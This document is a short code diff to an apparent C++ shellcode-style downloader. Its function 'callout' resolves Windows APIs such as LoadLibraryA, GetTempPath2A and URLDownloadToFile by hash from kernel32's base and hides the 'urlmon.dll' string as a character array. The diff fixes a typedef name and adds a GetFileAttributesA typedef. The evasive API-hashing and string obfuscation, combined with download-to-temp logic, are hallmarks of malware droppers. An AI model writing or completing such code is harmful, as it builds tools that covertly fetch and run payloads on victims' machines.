@@ -55,6 +55,7 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
 
 typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
 typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
+typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
 typedef void * (* mallocHeader)(std::size_t);
 typedef void * (* reallocHeader)(void *, std::size_t);
 typedef void (* freeHeader)(void *);
@@ -386,7 +387,7 @@ int callout(void)
       return 1;
 
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
-   GetTempPath2Header getTempPath2 = reinterpret_cast<GetTempPath2Header>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x7994452b));
+   GetTempPath2AHeader getTempPath2 = reinterpret_cast<GetTempPath2AHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x7994452b));
    char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
    PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
    URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xe6c2ead5));
